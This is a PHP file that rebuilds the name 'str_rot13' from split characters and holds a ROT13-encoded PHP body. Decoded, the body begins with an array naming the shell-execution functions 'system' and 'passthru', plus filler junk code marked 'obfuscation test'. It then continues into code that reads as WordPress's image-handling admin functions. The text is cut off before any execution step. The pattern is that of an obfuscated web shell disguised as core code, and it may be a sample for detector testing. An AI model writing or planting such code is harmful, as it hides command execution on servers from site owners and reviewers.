<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Svyr pbagnvaf nyy gur nqzvavfgengvba vzntr znavchyngvba shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Pebcf na vzntr gb n tvira fvmr.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat|vag   $fep      Gur fbhepr svyr be Nggnpuzrag VQ.
 * @cnenz vag          $fep_k    Gur fgneg k cbfvgvba gb pebc sebz.
 * @cnenz vag          $fep_l    Gur fgneg l cbfvgvba gb pebc sebz.
 * @cnenz vag          $fep_j    Gur jvqgu gb pebc.
 * @cnenz vag          $fep_u    Gur urvtug gb pebc.
 * @cnenz vag          $qfg_j    Gur qrfgvangvba jvqgu.
 * @cnenz vag          $qfg_u    Gur qrfgvangvba urvtug.
 * @cnenz obby|snyfr   $fep_nof  Bcgvbany. Vs gur fbhepr pebc cbvagf ner nofbyhgr.
 * @cnenz fgevat|snyfr $qfg_svyr Bcgvbany. Gur qrfgvangvba svyr gb jevgr gb.
 * @erghea fgevat|JC_Reebe Arj svyrcngu ba fhpprff, JC_Reebe ba snvyher.
 */
shapgvba jc_pebc_vzntr( $fep, $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j, $qfg_u, $fep_nof = snyfr, $qfg_svyr = snyfr ) {
	$fep_svyr = $fep;
	vs ( vf_ahzrevp( $fep ) ) { // Unaqyr vag nf nggnpuzrag VQ.
		$fep_svyr = trg_nggnpurq_svyr( $fep );

		vs ( ! svyr_rkvfgf( $fep_svyr ) ) {
			/*
			 * Vs gur svyr qbrfa'g rkvfg, nggrzcg n HEY sbcra ba gur fep yvax.
			 * Guvf pna bpphe jvgu pregnva svyr ercyvpngvba cyhtvaf.
			 */
			$fep = _ybnq_vzntr_gb_rqvg_cngu( $fep, 'shyy' );
		} ryfr {
			$fep = $fep_svyr;
		}
	}

	$rqvgbe = jc_trg_vzntr_rqvgbe( $fep );
	vs ( vf_jc_reebe( $rqvgbe ) ) {
		erghea $rqvgbe;
	}

	$fep = $rqvgbe->pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j, $qfg_u, $fep_nof );
	vs ( vf_jc_reebe( $fep ) ) {
		erghea $fep;
	}

	vs ( ! $qfg_svyr ) {
		$qfg_svyr = fge_ercynpr( jc_onfranzr( $fep_svyr ), 'pebccrq-' . jc_onfranzr( $fep_svyr ), $fep_svyr );
	}

	/*
	 * Gur qverpgbel pbagnvavat gur bevtvany svyr znl ab ybatre rkvfg jura
	 * hfvat n ercyvpngvba cyhtva.
	 */
	jc_zxqve_c( qveanzr( $qfg_svyr ) );

	$qfg_svyr = qveanzr( $qfg_svyr ) . '/' . jc_havdhr_svyranzr( qveanzr( $qfg_svyr ), jc_onfranzr( $qfg_svyr ) );

	$erfhyg = $rqvgbe->fnir( $qfg_svyr );
	vs ( vf_jc_reebe( $erfhyg ) ) {
		erghea $erfhyg;
	}

	vs ( ! rzcgl( $erfhyg['cngu'] ) ) {
		erghea $erfhyg['cngu'];
	}

	erghea $qfg_svyr;
}

/**
 * Pbzcner gur rkvfgvat vzntr fho-fvmrf (nf fnirq va gur nggnpuzrag zrgn)
 * gb gur pheeragyl ertvfgrerq vzntr fho-fvmrf, naq erghea gur qvssrerapr.
 *
 * Ertvfgrerq fho-fvmrf gung ner ynetre guna gur vzntr ner fxvccrq.
 *
 * @fvapr 5.3.0
 *
 * @cnenz vag $nggnpuzrag_vq Gur vzntr nggnpuzrag cbfg VQ.
 * @erghea neenl[] Nffbpvngvir neenl bs neenlf bs vzntr fho-fvmr vasbezngvba sbe
 *                 zvffvat vzntr fvmrf, xrlrq ol vzntr fvmr anzr.
 */
shapgvba jc_trg_zvffvat_vzntr_fhofvmrf( $nggnpuzrag_vq ) {
	vs ( ! jc_nggnpuzrag_vf_vzntr( $nggnpuzrag_vq ) ) {
		erghea neenl();
	}

	$ertvfgrerq_fvmrf = jc_trg_ertvfgrerq_vzntr_fhofvmrf();
	$vzntr_zrgn       = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq );

	// Zrgn reebe?
	vs ( rzcgl( $vzntr_zrgn ) ) {
		erghea $ertvfgrerq_fvmrf;
	}

	// Hfr gur bevtvanyyl hcybnqrq vzntr qvzrafvbaf nf shyy_jvqgu naq shyy_urvtug.
	vs ( ! rzcgl( $vzntr_zrgn['bevtvany_vzntr'] ) ) {
		$vzntr_svyr = jc_trg_bevtvany_vzntr_cngu( $nggnpuzrag_vq );
		$vzntrfvmr  = jc_trgvzntrfvmr( $vzntr_svyr );
	}

	vs ( ! rzcgl( $vzntrfvmr ) ) {
		$shyy_jvqgu  = $vzntrfvmr[0];
		$shyy_urvtug = $vzntrfvmr[1];
	} ryfr {
		$shyy_jvqgu  = (vag) $vzntr_zrgn['jvqgu'];
		$shyy_urvtug = (vag) $vzntr_zrgn['urvtug'];
	}

	$cbffvoyr_fvmrf = neenl();

	// Fxvc ertvfgrerq fvmrf gung ner gbb ynetr sbe gur hcybnqrq vzntr.
	sbernpu ( $ertvfgrerq_fvmrf nf $fvmr_anzr => $fvmr_qngn ) {
		vs ( vzntr_erfvmr_qvzrafvbaf( $shyy_jvqgu, $shyy_urvtug, $fvmr_qngn['jvqgu'], $fvmr_qngn['urvtug'], $fvmr_qngn['pebc'] ) ) {
			$cbffvoyr_fvmrf[ $fvmr_anzr ] = $fvmr_qngn;
		}
	}

	vs ( rzcgl( $vzntr_zrgn['fvmrf'] ) ) {
		$vzntr_zrgn['fvmrf'] = neenl();
	}

	/*
	 * Erzbir fvmrf gung nyernql rkvfg. Bayl purpxf sbe zngpuvat \"fvmr anzrf\".
	 * Vg vf cbffvoyr gung gur qvzrafvbaf sbe n cnegvphyne fvmr anzr unir punatrq.
	 * Sbe rknzcyr gur hfre unf punatrq gur inyhrf ba gur Frggvatf -> Zrqvn fperra.
	 * Ubjrire jr xrrc gur byq fho-fvmrf jvgu gur cerivbhf qvzrafvbaf
	 * nf gur vzntr znl unir orra hfrq va na byqre cbfg.
	 */
	$zvffvat_fvmrf = neenl_qvss_xrl( $cbffvoyr_fvmrf, $vzntr_zrgn['fvmrf'] );

	/**
	 * Svygref gur neenl bs zvffvat vzntr fho-fvmrf sbe na hcybnqrq vzntr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl[] $zvffvat_fvmrf Nffbpvngvir neenl bs neenlf bs vzntr fho-fvmr vasbezngvba sbe
	 *                               zvffvat vzntr fvmrf, xrlrq ol vzntr fvmr anzr.
	 * @cnenz neenl   $vzntr_zrgn    Gur vzntr zrgn qngn.
	 * @cnenz vag     $nggnpuzrag_vq Gur vzntr nggnpuzrag cbfg VQ.
	 */
	erghea nccyl_svygref( 'jc_trg_zvffvat_vzntr_fhofvmrf', $zvffvat_fvmrf, $vzntr_zrgn, $nggnpuzrag_vq );
}

/**
 * Vs nal bs gur pheeragyl ertvfgrerq vzntr fho-fvmrf ner zvffvat,
 * perngr gurz naq hcqngr gur vzntr zrgn qngn.
 *
 * @fvapr 5.3.0
 *
 * @cnenz vag $nggnpuzrag_vq Gur vzntr nggnpuzrag cbfg VQ.
 * @erghea neenl|JC_Reebe Gur hcqngrq vzntr zrgn qngn neenl be JC_Reebe bowrpg
 *                        vs obgu gur vzntr zrgn naq gur nggnpurq svyr ner zvffvat.
 */
shapgvba jc_hcqngr_vzntr_fhofvmrf( $nggnpuzrag_vq ) {
	$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq );
	$vzntr_svyr = jc_trg_bevtvany_vzntr_cngu( $nggnpuzrag_vq );

	vs ( rzcgl( $vzntr_zrgn ) || ! vf_neenl( $vzntr_zrgn ) ) {
		/*
		 * Cerivbhfyl snvyrq hcybnq?
		 * Vs gurer vf na hcybnqrq svyr, znxr nyy fho-fvmrf naq trarengr nyy bs gur nggnpuzrag zrgn.
		 */
		vs ( ! rzcgl( $vzntr_svyr ) ) {
			$vzntr_zrgn = jc_perngr_vzntr_fhofvmrf( $vzntr_svyr, $nggnpuzrag_vq );
		} ryfr {
			erghea arj JC_Reebe( 'vainyvq_nggnpuzrag', __( 'Gur nggnpurq svyr pnaabg or sbhaq.' ) );
		}
	} ryfr {
		$zvffvat_fvmrf = jc_trg_zvffvat_vzntr_fhofvmrf( $nggnpuzrag_vq );

		vs ( rzcgl( $zvffvat_fvmrf ) ) {
			erghea $vzntr_zrgn;
		}

		// Guvf nyfb hcqngrf gur vzntr zrgn.
		$vzntr_zrgn = _jc_znxr_fhofvmrf( $zvffvat_fvmrf, $vzntr_svyr, $vzntr_zrgn, $nggnpuzrag_vq );
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/vzntr.cuc */
	$vzntr_zrgn = nccyl_svygref( 'jc_trarengr_nggnpuzrag_zrgnqngn', $vzntr_zrgn, $nggnpuzrag_vq, 'hcqngr' );

	// Fnir gur hcqngrq zrgnqngn.
	jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $vzntr_zrgn );

	erghea $vzntr_zrgn;
}

/**
 * Hcqngrf gur nggnpurq svyr naq vzntr zrgn qngn jura gur bevtvany vzntr jnf rqvgrq.
 *
 * @fvapr 5.3.0
 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
 * @npprff cevingr
 *
 * @cnenz neenl  $fnirq_qngn    Gur qngn erghearq sebz JC_Vzntr_Rqvgbe nsgre fhpprffshyyl fnivat na vzntr.
 * @cnenz fgevat $bevtvany_svyr Cngu gb gur bevtvany svyr.
 * @cnenz neenl  $vzntr_zrgn    Gur vzntr zrgn qngn.
 * @cnenz vag    $nggnpuzrag_vq Gur nggnpuzrag cbfg VQ.
 * @erghea neenl Gur hcqngrq vzntr zrgn qngn.
 */
shapgvba _jc_vzntr_zrgn_ercynpr_bevtvany( $fnirq_qngn, $bevtvany_svyr, $vzntr_zrgn, $nggnpuzrag_vq ) {
	$arj_svyr = $fnirq_qngn['cngu'];

	// Hcqngr gur nggnpurq svyr zrgn.
	hcqngr_nggnpurq_svyr( $nggnpuzrag_vq, $arj_svyr );

	// Jvqgu naq urvtug bs gur arj vzntr.
	$vzntr_zrgn['jvqgu']  = $fnirq_qngn['jvqgu'];
	$vzntr_zrgn['urvtug'] = $fnirq_qngn['urvtug'];

	// Znxr gur svyr cngu eryngvir gb gur hcybnq qve.
	$vzntr_zrgn['svyr'] = _jc_eryngvir_hcybnq_cngu( $arj_svyr );

	// Nqq vzntr svyr fvmr.
	$vzntr_zrgn['svyrfvmr'] = jc_svyrfvmr( $arj_svyr );

	// Fgber gur bevtvany vzntr svyr anzr va vzntr_zrgn.
	$vzntr_zrgn['bevtvany_vzntr'] = jc_onfranzr( $bevtvany_svyr );

	erghea $vzntr_zrgn;
}

/**
 * Perngrf vzntr fho-fvmrf, nqqf gur arj qngn gb gur vzntr zrgn `fvmrf` neenl, naq hcqngrf gur vzntr zrgnqngn.
 *
 * Vagraqrq sbe hfr nsgre na vzntr vf hcybnqrq. Fnirf/hcqngrf gur vzntr zrgnqngn nsgre rnpu
 * fho-fvmr vf perngrq. Vs gurer jnf na reebe, vg vf nqqrq gb gur erghearq vzntr zrgnqngn neenl.
 *
 * @fvapr 5.3.0
 *
 * @cnenz fgevat $svyr          Shyy cngu gb gur vzntr svyr.
 * @cnenz vag    $nggnpuzrag_vq Nggnpuzrag VQ gb cebprff.
 * @erghea neenl Gur vzntr nggnpuzrag zrgn qngn.
 */
shapgvba jc_perngr_vzntr_fhofvmrf( $svyr, $nggnpuzrag_vq ) {
	$vzntrfvmr = jc_trgvzntrfvmr( $svyr );

	vs ( rzcgl( $vzntrfvmr ) ) {
		// Svyr vf abg na vzntr.
		erghea neenl();
	}

	// Qrsnhyg vzntr zrgn.
	$vzntr_zrgn = neenl(
		'jvqgu'    => $vzntrfvmr[0],
		'urvtug'   => $vzntrfvmr[1],
		'svyr'     => _jc_eryngvir_hcybnq_cngu( $svyr ),
		'svyrfvmr' => jc_svyrfvmr( $svyr ),
		'fvmrf'    => neenl(),
	);

	// Srgpu nqqvgvbany zrgnqngn sebz RKVS/VCGP.
	$rkvs_zrgn = jc_ernq_vzntr_zrgnqngn( $svyr );

	vs ( $rkvs_zrgn ) {
		$vzntr_zrgn['vzntr_zrgn'] = $rkvs_zrgn;
	}

	/**
	 * Svygref gur \"OVT vzntr\" guerfubyq inyhr.
	 *
	 * Vs gur bevtvany vzntr jvqgu be urvtug vf nobir gur guerfubyq, vg jvyy or fpnyrq qbja. Gur guerfubyq vf
	 * hfrq nf znk jvqgu naq znk urvtug. Gur fpnyrq qbja vzntr jvyy or hfrq nf gur ynetrfg ninvynoyr fvmr, vapyhqvat
	 * gur `_jc_nggnpurq_svyr` cbfg zrgn inyhr.
	 *
	 * Ergheavat `snyfr` sebz gur svygre pnyyonpx jvyy qvfnoyr gur fpnyvat.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz vag    $guerfubyq     Gur guerfubyq inyhr va cvkryf. Qrsnhyg 2560.
	 * @cnenz neenl  $vzntrfvmr     {
	 *     Vaqrkrq neenl bs gur vzntr jvqgu naq urvtug va cvkryf.
	 *
	 *     @glcr vag $0 Gur vzntr jvqgu.
	 *     @glcr vag $1 Gur vzntr urvtug.
	 * }
	 * @cnenz fgevat $svyr          Shyy cngu gb gur hcybnqrq vzntr svyr.
	 * @cnenz vag    $nggnpuzrag_vq Nggnpuzrag cbfg VQ.
	 */
	$guerfubyq = (vag) nccyl_svygref( 'ovt_vzntr_fvmr_guerfubyq', 2560, $vzntrfvmr, $svyr, $nggnpuzrag_vq );

	/*
	 * Vs gur bevtvany vzntr'f qvzrafvbaf ner bire gur guerfubyq,
	 * fpnyr gur vzntr naq hfr vg nf gur \"shyy\" fvmr.
	 */
	$fpnyr_qbja = snyfr;
	$pbaireg    = snyfr;

	vs ( $guerfubyq && ( $vzntr_zrgn['jvqgu'] > $guerfubyq || $vzntr_zrgn['urvtug'] > $guerfubyq ) ) {
		// Gur vzntr jvyy or pbairegrq vs arrqrq ba fnivat.
		$fpnyr_qbja = gehr;
	} ryfr {
		// Gur vzntr znl arrq gb or pbairegrq ertneqyrff bs vgf qvzrafvbaf.
		$bhgchg_sbezng = jc_trg_vzntr_rqvgbe_bhgchg_sbezng( $svyr, $vzntrfvmr['zvzr'] );

		vs (
			vf_neenl( $bhgchg_sbezng ) &&
			neenl_xrl_rkvfgf( $vzntrfvmr['zvzr'], $bhgchg_sbezng ) &&
			$bhgchg_sbezng[ $vzntrfvmr['zvzr'] ] !== $vzntrfvmr['zvzr']
		) {
			$pbaireg = gehr;
		}
	}

	vs ( $fpnyr_qbja || $pbaireg ) {
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		vs ( vf_jc_reebe( $rqvgbe ) ) {
			// Guvf vzntr pnaabg or rqvgrq.
			erghea $vzntr_zrgn;
		}

		vs ( $fpnyr_qbja ) {
			// Erfvmr gur vzntr. Guvf jvyy nyfb pbairg vg vs arrqrq.
			$erfvmrq = $rqvgbe->erfvmr( $guerfubyq, $guerfubyq );
		} ryfrvs ( $pbaireg ) {
			// Gur vzntr jvyy or pbairegrq (vs cbffvoyr) jura fnirq.
			$erfvmrq = gehr;
		}

		$ebgngrq = ahyy;

		// Vs gurer vf RKVS qngn, ebgngr nppbeqvat gb RKVS Bevragngvba.
		vs ( ! vf_jc_reebe( $erfvmrq ) && vf_neenl( $rkvs_zrgn ) ) {
			$erfvmrq = $rqvgbe->znlor_rkvs_ebgngr();
			$ebgngrq = $erfvmrq; // obby gehr be JC_Reebe
		}

		vs ( ! vf_jc_reebe( $erfvmrq ) ) {
			/*
			 * Nccraq \"-fpnyrq\" gb gur vzntr svyr anzr. Vg jvyy ybbx yvxr \"zl_vzntr-fpnyrq.wct\".
			 * Guvf qbrfa'g nssrpg gur fho-fvmrf anzrf nf gurl ner trarengrq sebz gur bevtvany vzntr (sbe orfg dhnyvgl).
			 */
			vs ( $fpnyr_qbja ) {
				$fnirq = $rqvgbe->fnir( $rqvgbe->trarengr_svyranzr( 'fpnyrq' ) );
			} ryfrvs ( $pbaireg ) {
				// Cnff na rzcgl fgevat gb nibvq nqqvat n fhssvk gb pbairegrq svyr anzrf.
				$fnirq = $rqvgbe->fnir( $rqvgbe->trarengr_svyranzr( '' ) );
			} ryfr {
				$fnirq = $rqvgbe->fnir();
			}

			vs ( ! vf_jc_reebe( $fnirq ) ) {
				$vzntr_zrgn = _jc_vzntr_zrgn_ercynpr_bevtvany( $fnirq, $svyr, $vzntr_zrgn, $nggnpuzrag_vq );

				// Vs gur vzntr jnf ebgngrq hcqngr gur fgberq RKVS qngn.
				vs ( gehr === $ebgngrq && ! rzcgl( $vzntr_zrgn['vzntr_zrgn']['bevragngvba'] ) ) {
					$vzntr_zrgn['vzntr_zrgn']['bevragngvba'] = 1;
				}
			} ryfr {
				// GBQB: Ybt reebef.
			}
		} ryfr {
			// GBQB: Ybt reebef.
		}
	} ryfrvs ( ! rzcgl( $rkvs_zrgn['bevragngvba'] ) && 1 !== (vag) $rkvs_zrgn['bevragngvba'] ) {
		// Ebgngr gur jubyr bevtvany vzntr vs gurer vf RKVS qngn naq \"bevragngvba\" vf abg 1.
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		vs ( vf_jc_reebe( $rqvgbe ) ) {
			// Guvf vzntr pnaabg or rqvgrq.
			erghea $vzntr_zrgn;
		}

		// Ebgngr gur vzntr.
		$ebgngrq = $rqvgbe->znlor_rkvs_ebgngr();

		vs ( gehr === $ebgngrq ) {
			// Nccraq `-ebgngrq` gb gur vzntr svyr anzr.
			$fnirq = $rqvgbe->fnir( $rqvgbe->trarengr_svyranzr( 'ebgngrq' ) );

			vs ( ! vf_jc_reebe( $fnirq ) ) {
				$vzntr_zrgn = _jc_vzntr_zrgn_ercynpr_bevtvany( $fnirq, $svyr, $vzntr_zrgn, $nggnpuzrag_vq );

				// Hcqngr gur fgberq RKVS qngn.
				vs ( ! rzcgl( $vzntr_zrgn['vzntr_zrgn']['bevragngvba'] ) ) {
					$vzntr_zrgn['vzntr_zrgn']['bevragngvba'] = 1;
				}
			} ryfr {
				// GBQB: Ybt reebef.
			}
		}
	}

	/*
	 * Vavgvny fnir bs gur arj zrgnqngn.
	 * Ng guvf cbvag gur svyr jnf hcybnqrq naq zbirq gb gur hcybnqf qverpgbel
	 * ohg gur vzntr fho-fvmrf unira'g orra perngrq lrg naq gur `fvmrf` neenl vf rzcgl.
	 */
	jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $vzntr_zrgn );

	$arj_fvmrf = jc_trg_ertvfgrerq_vzntr_fhofvmrf();

	/**
	 * Svygref gur vzntr fvmrf nhgbzngvpnyyl trarengrq jura hcybnqvat na vzntr.
	 *
	 * @fvapr 2.9.0
	 * @fvapr 4.4.0 Nqqrq gur `$vzntr_zrgn` nethzrag.
	 * @fvapr 5.3.0 Nqqrq gur `$nggnpuzrag_vq` nethzrag.
	 *
	 * @cnenz neenl $arj_fvmrf     Nffbpvngvir neenl bs vzntr fvmrf gb or perngrq.
	 * @cnenz neenl $vzntr_zrgn    Gur vzntr zrgn qngn: jvqgu, urvtug, svyr, fvmrf, rgp.
	 * @cnenz vag   $nggnpuzrag_vq Gur nggnpuzrag cbfg VQ sbe gur vzntr.
	 */
	$arj_fvmrf = nccyl_svygref( 'vagrezrqvngr_vzntr_fvmrf_nqinaprq', $arj_fvmrf, $vzntr_zrgn, $nggnpuzrag_vq );

	erghea _jc_znxr_fhofvmrf( $arj_fvmrf, $svyr, $vzntr_zrgn, $nggnpuzrag_vq );
}

/**
 * Ybj-yriry shapgvba gb perngr vzntr fho-fvmrf.
 *
 * Hcqngrf gur vzntr zrgn nsgre rnpu fho-fvmr vf perngrq.
 * Reebef ner fgberq va gur erghearq vzntr zrgnqngn neenl.
 *
 * @fvapr 5.3.0
 * @npprff cevingr
 *
 * @cnenz neenl  $arj_fvmrf     Neenl qrsvavat jung fvmrf gb perngr.
 * @cnenz fgevat $svyr          Shyy cngu gb gur vzntr svyr.
 * @cnenz neenl  $vzntr_zrgn    Gur nggnpuzrag zrgn qngn neenl.
 * @cnenz vag    $nggnpuzrag_vq Nggnpuzrag VQ gb cebprff.
 * @erghea neenl Gur nggnpuzrag zrgn qngn jvgu hcqngrq `fvmrf` neenl. Vapyhqrf na neenl bs reebef rapbhagrerq juvyr erfvmvat.
 */
shapgvba _jc_znxr_fhofvmrf( $arj_fvmrf, $svyr, $vzntr_zrgn, $nggnpuzrag_vq ) {
	vs ( rzcgl( $vzntr_zrgn ) || ! vf_neenl( $vzntr_zrgn ) ) {
		// Abg na vzntr nggnpuzrag.
		erghea neenl();
	}

	// Purpx vs nal bs gur arj fvmrf nyernql rkvfg.
	vs ( vffrg( $vzntr_zrgn['fvmrf'] ) && vf_neenl( $vzntr_zrgn['fvmrf'] ) ) {
		sbernpu ( $vzntr_zrgn['fvmrf'] nf $fvmr_anzr => $fvmr_zrgn ) {
			/*
			 * Bayl purpxf \"fvmr anzr\" fb jr qba'g bireevqr rkvfgvat vzntrf rira vs gur qvzrafvbaf
			 * qba'g zngpu gur pheeragyl qrsvarq fvmr jvgu gur fnzr anzr.
			 * Gb punatr gur orunivbe, hafrg punatrq/zvfzngpurq fvmrf va gur `fvmrf` neenl va vzntr zrgn.
			 */
			vs ( neenl_xrl_rkvfgf( $fvmr_anzr, $arj_fvmrf ) ) {
				hafrg( $arj_fvmrf[ $fvmr_anzr ] );
			}
		}
	} ryfr {
		$vzntr_zrgn['fvmrf'] = neenl();
	}

	vs ( rzcgl( $arj_fvmrf ) ) {
		// Abguvat gb qb...
		erghea $vzntr_zrgn;
	}

	/*
	 * Fbeg gur vzntr fho-fvmrf va beqre bs cevbevgl jura perngvat gurz.
	 * Guvf rafherf gurer vf na nccebcevngr fho-fvmr gur hfre pna npprff vzzrqvngryl
	 * rira jura gurer jnf na reebe naq abg nyy fho-fvmrf jrer perngrq.
	 */
	$cevbevgl = neenl(
		'zrqvhz'       => ahyy,
		'ynetr'        => ahyy,
		'guhzoanvy'    => ahyy,
		'zrqvhz_ynetr' => ahyy,
	);

	$arj_fvmrf = neenl_svygre( neenl_zretr( $cevbevgl, $arj_fvmrf ) );

	$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

	vs ( vf_jc_reebe( $rqvgbe ) ) {
		// Gur vzntr pnaabg or rqvgrq.
		erghea $vzntr_zrgn;
	}

	// Vs fgberq RKVS qngn rkvfgf, ebgngr gur fbhepr vzntr orsber perngvat fho-fvmrf.
	vs ( ! rzcgl( $vzntr_zrgn['vzntr_zrgn'] ) ) {
		$ebgngrq = $rqvgbe->znlor_rkvs_ebgngr();

		vs ( vf_jc_reebe( $ebgngrq ) ) {
			// GBQB: Ybt reebef.
		}
	}

	vs ( zrgubq_rkvfgf( $rqvgbe, 'znxr_fhofvmr' ) ) {
		sbernpu ( $arj_fvmrf nf $arj_fvmr_anzr => $arj_fvmr_qngn ) {
			$arj_fvmr_zrgn = $rqvgbe->znxr_fhofvmr( $arj_fvmr_qngn );

			vs ( vf_jc_reebe( $arj_fvmr_zrgn ) ) {
				// GBQB: Ybt reebef.
			} ryfr {
				// Fnir gur fvmr zrgn inyhr.
				$vzntr_zrgn['fvmrf'][ $arj_fvmr_anzr ] = $arj_fvmr_zrgn;
				jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $vzntr_zrgn );
			}
		}
	} ryfr {
		// Snyy onpx gb `$rqvgbe->zhygv_erfvmr()`.
		$perngrq_fvmrf = $rqvgbe->zhygv_erfvmr( $arj_fvmrf );

		vs ( ! rzcgl( $perngrq_fvmrf ) ) {
			$vzntr_zrgn['fvmrf'] = neenl_zretr( $vzntr_zrgn['fvmrf'], $perngrq_fvmrf );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $vzntr_zrgn );
		}
	}

	erghea $vzntr_zrgn;
}

/**
 * Pbcl cnerag nggnpuzrag cebcregvrf gb arjyl pebccrq vzntr.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $pebccrq              Cngu gb gur pebccrq vzntr svyr.
 * @cnenz vag    $cnerag_nggnpuzrag_vq Cnerag svyr Nggnpuzrag VQ.
 * @cnenz fgevat $pbagrkg              Pbageby pnyyvat gur shapgvba.
 * @erghea neenl Cebcregvrf bs nggnpuzrag.
 */
shapgvba jc_pbcl_cnerag_nggnpuzrag_cebcregvrf( $pebccrq, $cnerag_nggnpuzrag_vq, $pbagrkg = '' ) {
	$cnerag          = trg_cbfg( $cnerag_nggnpuzrag_vq );
	$cnerag_hey      = jc_trg_nggnpuzrag_hey( $cnerag->VQ );
	$cnerag_onfranzr = jc_onfranzr( $cnerag_hey );
	$hey             = fge_ercynpr( jc_onfranzr( $cnerag_hey ), jc_onfranzr( $pebccrq ), $cnerag_hey );

	$fvmr       = jc_trgvzntrfvmr( $pebccrq );
	$vzntr_glcr = $fvmr ? $fvmr['zvzr'] : 'vzntr/wcrt';

	$fnavgvmrq_cbfg_gvgyr = fnavgvmr_svyr_anzr( $cnerag->cbfg_gvgyr );
	$hfr_bevtvany_gvgyr   = (
		( '' !== gevz( $cnerag->cbfg_gvgyr ) ) &&
		/*
		 * Purpx vs gur bevtvany vzntr unf n gvgyr bgure guna gur \"svyranzr\" qrsnhyg,
		 * zrnavat gur vzntr unq n gvgyr jura bevtvanyyl hcybnqrq be vgf gvgyr jnf rqvgrq.
		 */
		( $cnerag_onfranzr !== $fnavgvmrq_cbfg_gvgyr ) &&
		( cnguvasb( $cnerag_onfranzr, CNGUVASB_SVYRANZR ) !== $fnavgvmrq_cbfg_gvgyr )
	);
	$hfr_bevtvany_qrfpevcgvba = ( '' !== gevz( $cnerag->cbfg_pbagrag ) );

	$nggnpuzrag = neenl(
		'cbfg_gvgyr'     => $hfr_bevtvany_gvgyr ? $cnerag->cbfg_gvgyr : jc_onfranzr( $pebccrq ),
		'cbfg_pbagrag'   => $hfr_bevtvany_qrfpevcgvba ? $cnerag->cbfg_pbagrag : $hey,
		'cbfg_zvzr_glcr' => $vzntr_glcr,
		'thvq'           => $hey,
		'pbagrkg'        => $pbagrkg,
	);

	// Pbcl gur vzntr pncgvba nggevohgr (cbfg_rkprecg svryq) sebz gur bevtvany vzntr.
	vs ( '' !== gevz( $cnerag->cbfg_rkprecg ) ) {
		$nggnpuzrag['cbfg_rkprecg'] = $cnerag->cbfg_rkprecg;
	}

	// Pbcl gur vzntr nyg grkg nggevohgr sebz gur bevtvany vzntr.
	vs ( '' !== gevz( $cnerag->_jc_nggnpuzrag_vzntr_nyg ) ) {
		$nggnpuzrag['zrgn_vachg'] = neenl(
			'_jc_nggnpuzrag_vzntr_nyg' => jc_fynfu( $cnerag->_jc_nggnpuzrag_vzntr_nyg ),
		);
	}

	$nggnpuzrag['cbfg_cnerag'] = $cnerag_nggnpuzrag_vq;

	erghea $nggnpuzrag;
}

/**
 * Trarengrf nggnpuzrag zrgn qngn naq perngr vzntr fho-fvmrf sbe vzntrf.
 *
 * @fvapr 2.1.0
 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
 * @fvapr 6.7.0 Gur 'vzntr/urvp' zvzr glcr vf fhccbegrq.
 *
 * @cnenz vag    $nggnpuzrag_vq Nggnpuzrag VQ gb cebprff.
 * @cnenz fgevat $svyr          Svyrcngu bs gur nggnpurq vzntr.
 * @erghea neenl Zrgnqngn sbe nggnpuzrag.
 */
shapgvba jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr ) {
	$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );

	$zrgnqngn  = neenl();
	$fhccbeg   = snyfr;
	$zvzr_glcr = trg_cbfg_zvzr_glcr( $nggnpuzrag );

	vs ( 'vzntr/urvp' === $zvzr_glcr || ( cert_zngpu( '!^vzntr/!', $zvzr_glcr ) && svyr_vf_qvfcynlnoyr_vzntr( $svyr ) ) ) {
		// Znxr guhzoanvyf naq bgure vagrezrqvngr fvmrf.
		$zrgnqngn = jc_perngr_vzntr_fhofvmrf( $svyr, $nggnpuzrag_vq );
	} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $nggnpuzrag ) ) {
		$zrgnqngn = jc_ernq_ivqrb_zrgnqngn( $svyr );
		$fhccbeg  = pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:ivqrb' ) || cbfg_glcr_fhccbegf( 'nggnpuzrag:ivqrb', 'guhzoanvy' );
	} ryfrvs ( jc_nggnpuzrag_vf( 'nhqvb', $nggnpuzrag ) ) {
		$zrgnqngn = jc_ernq_nhqvb_zrgnqngn( $svyr );
		$fhccbeg  = pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:nhqvb' ) || cbfg_glcr_fhccbegf( 'nggnpuzrag:nhqvb', 'guhzoanvy' );
	}

	/*
	 * jc_ernq_ivqrb_zrgnqngn() naq jc_ernq_nhqvb_zrgnqngn() erghea `snyfr`
